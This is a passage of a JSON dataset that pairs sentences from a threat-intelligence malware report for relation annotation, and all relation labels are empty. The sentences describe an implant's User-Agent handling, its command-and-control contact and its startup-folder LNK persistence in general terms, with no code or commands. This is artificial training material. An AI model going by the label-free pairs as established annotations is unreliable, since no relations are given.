        "S1": "Analyzing the code statically we could observe that the payload only checks 2 of these 5 parameters but all of them must be present in order to execute the implant:",
        "S2": "If the implant cannot detect the User-Agent in the system, it will use the default Mozilla User-Agent instead:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S107<=>S110",
        "S1": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:",
        "S2": "Unfortunately, during our analysis, the C2 was not active which limited our ability for further analysis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S107<=>S114",
        "S1": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:",
        "S2": "In our analysis we could observe how the adversary ensures persistence by delivering an LNK file into the startup folder",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S107<=>S109",
        "S1": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:",
        "S2": "Running the sample dynamically and intercepting the TLS traffic, we could see the connection to the command and control server:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S110<=>S112",
        "S1": "Unfortunately, during our analysis, the C2 was not active which limited our ability for further analysis.",
        "S2": "We could find at least 5 different campaign IDs in our analysis, which suggests that the analysis in this document is merely the tip of the iceberg:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S112<=>S114",
        "S1": "We could find at least 5 different campaign IDs in our analysis, which suggests that the analysis in this document is merely the tip of the iceberg:",
        "S2": "In our analysis we could observe how the adversary ensures persistence by delivering an LNK file into the startup folder",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S114<=>S116",
        "S1": "In our analysis we could observe how the adversary ensures persistence by delivering an LNK file into the startup folder",
        "S2": "Dynamically, and through the Windows APIs NtCreateFile and NtWriteFile, the LNK is written in the startup folder.",
        "relation": ""
    }
]